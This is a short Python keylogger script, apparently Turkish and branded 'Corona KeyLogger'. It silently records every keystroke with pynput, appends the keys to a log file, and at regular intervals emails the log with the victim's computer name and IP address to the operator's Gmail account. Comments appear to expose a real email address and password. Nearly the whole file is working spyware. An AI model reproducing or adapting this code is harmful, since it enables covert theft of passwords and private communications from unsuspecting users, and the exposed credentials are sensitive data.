import time, pynput.keyboard, yagmail, socket

tuslar = []
yollamaSuresi = 0
mailAdres = "" # < ssksns44@gmail.com.
mailParola = "" # < Sakarya5454.
makinaAd = socket.gethostname()
kayitEkle = open("log.txt", "a")
mail = yagmail.SMTP(mailAdres, mailParola)

mail.send(
    to = mailAdres,
    subject = "CORONA - KeyLogger Aktif",
    contents = f"Corona KeyLogger aktif edildi, yakında bilgiler mail adresinize iletilecek.",
)

def klavyeDinle(tus):
    global tuslar
    try:
        tuslar.append(tus)
    except AttributeError:
        if tus == tus.space: 
            tuslar.append(tus)
        else:
            tuslar.append(tus)

def mailYolla():
    global tuslar, mailAdres, mailParola, mail
    kayitEkle.write(str(tuslar))
    mail.send(
        to = mailAdres,
        subject = "CORONA - KeyLogger Bildirimi",
        contents = f"""Merhaba Corona Logger kullanıcısı! Az önce bir kullanıcıdan veri aldın.

Kurbanın PC Adı    : > {makinaAd} <
Kurbanın IP Adresi : > {socket.gethostbyname(makinaAd)} <

Log kayıtlarını ekte bulabilirsiniz.""",
        attachments = "log.txt" # Log dosyasının adı.
    )
    tuslar = []

keylogger = pynput.keyboard.Listener(on_press=klavyeDinle)
keylogger.start

with keylogger:
    while True:
        if yollamaSuresi == 5: # 5'i istediğiniz süre ile değiştirin. Örnek; 6 yazarsanız, 6 saniyede bir bildirim alırsınız.
            mailYolla()
            yollamaSuresi = 0
        else:
            time.sleep(1)
            yollamaSuresi += 1
